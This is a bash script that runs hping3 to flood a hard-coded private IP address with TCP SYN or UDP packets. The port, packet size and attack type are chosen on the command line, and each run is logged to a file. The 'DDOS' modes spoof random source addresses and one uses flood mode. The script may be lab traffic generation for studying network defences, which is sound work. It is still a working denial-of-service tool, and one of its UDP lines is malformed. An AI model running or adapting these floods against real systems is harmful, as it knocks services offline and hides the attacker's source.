#!/bin/bash

if [ $# -ne 4 ]; then
    echo "Usage: $0 <port> <protocol> <packet_size> <attack_type>"
    exit 1
fi

port=$1
protocol=$2
packet_size=$3
attack_type=$4
target_ip="10.0.192.8"
interval=20000

if [ "$protocol" == "TCP" ]; then
    if [ "$attack_type" == "DOS" ]; then
        echo "Running TCP DOS attack with $packet_size size packets on port $port"
        echo "Time: $(date '+%Y-%m-%d %H:%M:%S'), Port: $1, Protocol: $2, packet_size: $3, attack_type: $4" >> parameter_changes.txt
        hping3 -i u$interval -S -d $packet_size -p $port $target_ip
    elif [ "$attack_type" == "DDOS" ]; then
        echo "Running TCP DDOS attack with $packet_size size packets on port $port"
        echo "Time: $(date '+%Y-%m-%d %H:%M:%S'), Port: $1, Protocol: $2, packet_size: $3, attack_type: $4" >> parameter_changes.txt
        hping3 --rand-source -i u$interval -S -d $packet_size -p $port $target_ip 
    fi
elif [ "$protocol" == "UDP" ]; then
    if [ "$attack_type" == "DOS" ]; then
        echo "Running UDP DOS attack with $packet_size size packets on port $port"
        echo "Time: $(date '+%Y-%m-%d %H:%M:%S'), Port: $1, Protocol: $2, packet_size: $3, attack_type: $4" >> parameter_changes.txt
        hping3 --udp -i u$interval -d $packet_size -p $port $target_ip
    elif [ "$attack_type" == "DDOS" ]; then
        echo "Running UDP DDOS attack with $packet_size size packets on port $port"
        echo "Time: $(date '+%Y-%m-%d %H:%M:%S'), Port: $1, Protocol: $2, packet_size: $3, attack_type: $4" >> parameter_changes.txt
        #hping3 --rand-source --udp -i u$interval -d $packet_size -p $port $target_ip
	hping3 --rand-source --udp -i -d $packet_size -p $port $target_ip --flood  
    fi
else
    echo "Invalid protocol specified: $protocol"
    exit 1
fi

